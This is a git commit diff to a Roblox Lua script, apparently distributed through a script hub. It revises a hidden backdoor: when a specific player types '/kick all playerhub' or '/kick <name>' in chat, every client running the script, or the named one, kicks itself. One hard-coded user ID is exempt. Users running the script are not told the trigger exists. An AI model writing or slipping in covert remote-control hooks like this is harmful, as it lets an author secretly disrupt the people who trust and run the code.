24921421cbaaa5f3a463f3ac4a461bd03a396aed
JustAP1ayer <70037178+JustAP1ayer@users.noreply.github.com>
2023-08-23 21:48:14 -0400

    Update fuckpeople.lua

--- fuckpeople.lua
+++ fuckpeople.lua
@@ -1,15 +1,17 @@
 
-    wait(1)
+    wait(1.5)
     game:GetService("Players").PlayerAdded:Connect(function(player)
         wait(1)
         game.Players.PlayerAdded:Connect(function(player)
             wait(1)
             player.Chatted:Connect(function(message)
                 wait(1)
-                if (player.Name == "Actinium_Ac") and message == "/crash"  then
-                    if game.Players.LocalPlayer.UserId ~=
-                    116781531 then
-                    game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick ;)")
+                if (player.Name == "Actinium_Ac") and message == "/kick all playerhub" then
+                    if game.Players.LocalPlayer.UserId ~= 116781531 then
+                        game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick to everyone ;)")
+                    end
+                    if (player.Name == "Actinium_Ac") and message == "/kick " .. tostring(game.Players.LocalPlayer.Name) then
+                        game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick to you ;)")
                     end
                 end
             end)
@@ -19,9 +21,12 @@
     for _, player in ipairs(game.Players:GetPlayers()) do
         player.Chatted:Connect(function(message)
             wait(1)
-            if (player.Name == "Actinium_Ac") and message == "/crash"   then
+            if (player.Name == "Actinium_Ac") and message == "/kick all playerhub" then
                 if game.Players.LocalPlayer.UserId ~= 116781531 then
-                game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick ;)")
+                    game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick to everyone ;)")
+                end
+                if (player.Name == "Actinium_Ac") and message == "/kick " .. tostring(game.Players.LocalPlayer.Name) then
+                    game.Players.LocalPlayer:Kick("Script Creator/Owner Requested Kick to you ;)")
                 end
             end
         end)
